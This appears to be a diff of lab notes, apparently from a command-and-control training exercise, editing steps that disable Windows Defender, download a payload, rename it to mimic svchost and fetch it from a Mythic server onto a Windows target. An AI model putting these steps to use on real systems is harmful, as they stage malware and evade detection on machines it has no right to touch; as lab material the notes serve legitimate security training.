@@ -139,7 +139,7 @@ Disable Windows Defender:
 1. **Download Payload, Rename file to "svchost-emaan.exe", move the file to a new directory**
     
     `wget <payload_download_link> --no-check-certificate
-    `mv lcd5d49e-680e-4478-8526-708858e25b14 svch`
+    `mv lcd5d49e-680e-4478-8526-708858e25b14 svchost-emaan.exe`
     
     ![[Pasted image 20251018170657.png]]
     
@@ -153,7 +153,7 @@ Disable Windows Defender:
 ![[Pasted image 20251018171120.png]]
 3. **Download on Windows Target**
     
-    `Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
+    `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
     
     
 4. **Execute Payload**
